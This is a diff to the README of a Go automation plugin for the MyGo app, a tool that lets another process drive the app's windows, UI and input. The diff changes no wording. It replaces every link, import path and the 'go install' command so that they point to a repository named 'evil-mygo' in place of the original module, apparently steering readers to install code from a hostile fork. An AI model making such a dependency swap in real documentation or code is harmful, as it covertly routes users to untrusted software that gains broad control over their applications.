@@ -1,6 +1,6 @@
 # automation
 
-Drive a running [MyGo](https://github.com/egoist/mygo) app from another
+Drive a running [MyGo](https://github.com/caelyreth/evil-mygo) app from another
 process, as end-to-end test runners and agents do: list its windows, read
 the elements of their native UI with the app's keys, act on them, send
 pointer, wheel, key and text input, choose menu items, evaluate scripts in
@@ -13,7 +13,7 @@ socket that only the user can open.
 
 package main
 
-import _ "github.com/egoist/mygo/plugins/automation"
+import _ "github.com/caelyreth/evil-mygo/plugins/automation"
 ```
 
 ```sh
@@ -26,7 +26,7 @@ compact snapshots, short refs and diffs once the UI settled, whose guide
 it prints:
 
 ```sh
-go install github.com/egoist/mygo/plugins/automation/cmd/mygo-automation
+go install github.com/caelyreth/evil-mygo/plugins/automation/cmd/mygo-automation
 mygo-automation skills
 ```
 
